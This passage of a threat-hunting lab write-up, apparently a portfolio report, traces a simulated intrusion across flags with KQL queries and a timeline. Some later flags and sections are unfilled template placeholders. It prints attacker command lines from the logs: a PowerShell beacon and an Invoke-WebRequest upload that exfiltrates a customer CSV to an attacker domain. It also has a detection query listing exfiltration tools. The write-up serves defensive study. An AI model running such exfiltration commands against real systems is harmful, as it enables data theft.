The initial communications with the attacker-controlled domain showed a consistent and predictable timing pattern between check-ins. The repeated, evenly spaced callbacks indicate that the channel was being driven by an automated beacon process rather than an operator manually issuing commands.The timing pattern suggests a scheduled/scripted callback mechanism where the implant periodically contacted the C2 infrastructure to check for instructions.

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | npt-ws01 |
| Timestamp | 2026-06-16T23:15:47.0470725Z|
| Process | powershell.exe |
| Parent Process |  powershell.exe |
| Command Line | "powershell.exe" -NoProfile -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri "https://updates.sync-northpeak.com/api/status?host=NPT-WS01" -UseBasicParsing -TimeoutSec 4 |

### 💡 Why it matters
Beacon timing analysis helps distinguish between hands-on-keyboard activity and automated malware communication. A human operator typically creates irregular activity based on their actions, while malware implants often communicate at predictable intervals.

Identifying automated beacon behavior allows defenders to:
- Detect command-and-control infrastructure.
- Identify compromised endpoints communicating with external systems.
- Differentiate automated malware activity from legitimate administrative actions.
- Build behavioral detections based on communication patterns rather than static indicators.

### 🔧 KQL Query Used
```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2026-06-16 18:00:00) .. datetime(2026-06-17 02:00:00))
| where DeviceName has "npt-ws01"
| where ProcessCommandLine contains "northpeak.com"
| project TimeGenerated, ProcessCommandLine
| sort by TimeGenerated asc
| extend GapSeconds = datetime_diff('second', TimeGenerated, prev(TimeGenerated, 1))
| project TimeGenerated, GapSeconds, ProcessCommandLine
```

### 🖼️ Screenshot
<img width="975" height="97" alt="image" src="https://github.com/user-attachments/assets/13ee1657-6888-4dfc-abdb-a0cd63847fcf" />


### 🛠️ Detection Recommendation

**Answer:**  
Automated beacon, regular timing indicates a scheduled/scripted callback mechanism rather than manual operator activity

</details>

---

<details>
<summary id="-flag-15">🚩 <strong>Flag 15: Crown Jewel Exfil <Technique Name></strong></summary>

### 🎯 Objective
`HUNT LEAD: "Last thing they did was take the crown jewels out. Name the file, the host it left from, and where it went."`

### 📌 Finding
The attacker performed the final stage of the intrusion by exfiltrating sensitive customer data from the server environment. A PowerShell-based upload command transferred the file `customer_data_export_20260616.csv` from `npt-srv01` to the attacker-controlled command-and-control infrastructure at:`https://cdn.sync-northpeak.com/api/upload?host=NPT-SRV01&data=customers` The exfiltration was performed using `Invoke-WebRequest`, allowing the attacker to send collected data directly to their external infrastructure over HTTPS.


### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | <Placeholder> |
| Timestamp | 2026-06-16T23:44:08.034865Z |
| Process | powershell.exe |
| Parent Process | powershell.exe |
| Command Line | "powershell.exe" -NoProfile -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri 'https://cdn.sync-northpeak.com/api/upload?host=NPT-SRV01&data=customers' -InFile 'C:\temp\customer_data_export_20260616.csv' -UseBasicParsing -TimeoutSec 5  |

### 💡 Why it matters
Data exfiltration represents the final objective of the intrusion and confirms the attacker successfully moved beyond initial access and persistence into data theft.

The use of PowerShell and HTTPS-based web requests allowed the attacker to:
- Transfer sensitive data without deploying additional tools.
- Blend malicious traffic with normal web communication.
- Avoid detection by using built-in Windows utilities.
- Exfiltrate customer information from a high-value server asset.

The presence of a staged CSV export file indicates the attacker first collected and prepared the data before transferring it to external infrastructure.

### 🔧 KQL Query Used
```kql
DeviceProcessEvents
| where Timestamp between (datetime(2026-06-16T20:00:00Z) .. datetime(2026-06-17T00:30:00Z))
| where DeviceName has_any ("npt-ws01", "npt-srv01")
| where ProcessCommandLine has_any ("7z", "rar", "Compress-Archive", "rclone", "curl", "wget", "Invoke-WebRequest", "UploadFile", "bitsadmin"
)
| project Timestamp, DeviceName, FileName, ProcessCommandLine
```

### 🖼️ Screenshot
<img width="975" height="269" alt="image" src="https://github.com/user-attachments/assets/66c28f22-fefd-45ff-a465-f32265c6e79a" />

**Answer:**  
customer_data_export_20260616.csv, npt-srv01, cdn.sync-northpeak.com

</details>

---

<details>
<summary id="-flag-16">🚩 <strong>Flag 16: Exfil Session Correlation <Technique Name></strong></summary>

### 🎯 Objective
`HUNT LEAD: "That export went out while they were live in a remote session on the server, and there were two sessions. Tell me which one they were in when they did it: the first, or the one they came back through."`

### 📌 Finding
The customer data export occurred at `2026-06-16T23:44:08.034865Z`, shortly after the attacker established their second remote interactive session on `npt-srv01` at `2026-06-16T23:42:52.7446674Z`.

The first remote session began at `2026-06-16T21:58:08.9960818Z`, while the second session occurred immediately before the exfiltration event. The timeline correlation confirms the attacker returned through the second remote session and performed the data theft from that session.


### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | npt-srv01 |
| Timestamp | 2026-06-16T23:42:52.7446674Z`|
| Process | lsass.exe |
| Parent Process | N/a |
| Command Line | N/a |

### 💡 Why it matters
Correlating authentication activity with process execution allows defenders to attribute actions to the correct attacker session. In this case, the attacker did not perform exfiltration during their original access session; they returned through a second remote interactive session immediately before transferring the customer export file.

This matters because:
- It establishes the attacker's operational timeline.
- It links the exfiltration event to a specific authenticated session.
- It helps identify compromised accounts used for remote access.
- It prevents incorrect attribution when multiple sessions exist on the same host.

Remote session correlation is critical during incident response because attackers frequently disconnect and reconnect, creating multiple logon artifacts that can obscure the actual timeline.

### 🔧 KQL Query Used

### 🔧 KQL Query Used
```kql
DeviceLogonEvents
| where DeviceName == "npt-srv01"
| where TimeGenerated between (
    datetime(2026-06-16 20:00:00) ..
    datetime(2026-06-17 00:30:00)
)
| where LogonType == "RemoteInteractive"
| project Timestamp, DeviceName, AccountName, RemoteIP, LogonType, ActionType
| order by Timestamp asc

```

### 🖼️ Screenshot
<img width="975" height="199" alt="image" src="https://github.com/user-attachments/assets/ab29c6d2-8008-4676-82e8-7b23f18c2d0c" />


### 🛠️ Detection Recommendation

**Hunting Tip:**  
<Actionable guidance for defenders>

</details>

---

<details>
<summary id="-flag-17">🚩 <strong>Flag 17: Holding the Ground <Technique Name></strong></summary>

### 🎯 Objective
`HUNT LEAD: "Here's what should bother you. They were hands-on for hours and nothing tripped. Check whether they tore the defences down to manage that. They didn't. So tell me the model, what let them operate this freely without going near the security stack."`

### 📌 Finding
<High-level description of the activity>

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | <Placeholder> |
| Timestamp | <Placeholder> |
| Process | <Placeholder> |
| Parent Process | <Placeholder> |
| Command Line | <Placeholder> |

### 💡 Why it matters
<Explain impact, risk, and relevance>

### 🔧 KQL Query Used
<Add KQL here>

### 🖼️ Screenshot
<Insert screenshot>

### 🛠️ Detection Recommendation

**Hunting Tip:**  
<Actionable guidance for defenders>

</details>

---

<details>
<summary id="-flag-18">🚩 <strong>Flag 18: Confirming The Foothold's Rights <Technique Name></strong></summary>

### 🎯 Objective
`HUNT LEAD: "When the operator comes back into the workstation for the second time, before they touch anything else they run a short burst to check who they are and what they can do. The last command in that burst isn't a plain identity check, it's testing for one specific thing. Tell me what they were confirming about their own account."`

### 📌 Finding
<High-level description of the activity>

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | <Placeholder> |
| Timestamp | <Placeholder> |
| Process | <Placeholder> |
| Parent Process | <Placeholder> |
| Command Line | <Placeholder> |

### 💡 Why it matters
<Explain impact, risk, and relevance>

### 🔧 KQL Query Used
<Add KQL here>

### 🖼️ Screenshot
<Insert screenshot>

### 🛠️ Detection Recommendation

**Hunting Tip:**  
<Actionable guidance for defenders>

</details>

---

## Timeline

| Time (UTC)                   | Phase                  | Event                                                                                                                                                                                                                                                                             |
| ---------------------------- | ---------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **2026-06-16 20:57:21**      | Initial Access         | Attacker successfully authenticated to **npt-ws01** from external IP **148.64.103.173** via **RDP** using valid credentials. The remote client hostname was identified as **LORANSE**.                                                                                            |
| **2026-06-16 21:57:36**      | Initial Access         | A second successful **RDP** session was established to **npt-srv01** from the same external IP, confirming multiple externally accessible systems.                                                                                                                                |
| **2026-06-16 22:16:52**      | Linux Reconnaissance   | On **npt-linux01**, the attacker enumerated privileges using **`sudo -l`** to determine potential privilege escalation paths.                                                                                                                                                     |
| **2026-06-16 22:21**         | Internal Discovery     | The attacker verified Windows host reachability from Linux using **`/dev/tcp`** against **TCP/3389**, confirming RDP accessibility before pivoting.                                                                                                                               |
| **2026-06-16 22:31**         | Tooling                | The attacker installed **pipx** and **NetExec** to facilitate lateral movement and authenticated operations within the environment.                                                                                                                                               |
| **2026-06-16 22:32**         | Lateral Movement       | Using **NetExec** over **SMB (TCP/445)**, the attacker authenticated as **sancadmin** from **10.2.0.30** to **npt-ws01**, pivoting from Linux into the Windows environment.                                                                                                       |
| **2026-06-16 22:43**         | Privilege Verification | The attacker executed **`whoami.exe /groups`** to verify membership in privileged security groups before continuing operations.                                                                                                                                                   |
| **2026-06-16 23:04:16**      | Persistence            | Persistence was established by creating a **Windows Run Registry** key that launched **NorthpeakSyncTray.ps1** with hidden PowerShell execution whenever the user logged in.                                                                                                      |
| **2026-06-16 23:19:22**      | Command & Control      | The attacker deployed an encoded **PowerShell Invoke-WebRequest** beacon communicating with **cdn.sync-northpeak.com**. Beacon intervals showed a regular cadence consistent with an automated callback mechanism.                                                                |
| **2026-06-16 23:44:08**      | Data Exfiltration      | Sensitive file **customer_data_export_20260616.csv** was exfiltrated from **npt-srv01** to **cdn.sync-northpeak.com** during the attacker's second remote session using **Invoke-WebRequest**.                                                                                    |
| **Post-Incident Assessment** | Findings               | The investigation concluded the attacker relied on **valid credentials, built-in Windows utilities, and living-off-the-land techniques**, avoiding malware deployment or security-control tampering while maintaining persistent access and successfully stealing customer data.  |

## 🚨 Detection Gaps & Recommendations

### Observed Gaps
- <Placeholder>
- <Placeholder>
- <Placeholder>

### Recommendations
- <Placeholder>
- <Placeholder>
- <Placeholder>

---

## 🧾 Final Assessment

<Concise executive-style conclusion summarizing risk, attacker sophistication, and defensive posture.>

---

## 📎 Analyst Notes

- Report structured for interview and portfolio review  
- Evidence reproducible via advanced hunting  
- Techniques mapped directly to MITRE ATT&CK  

---
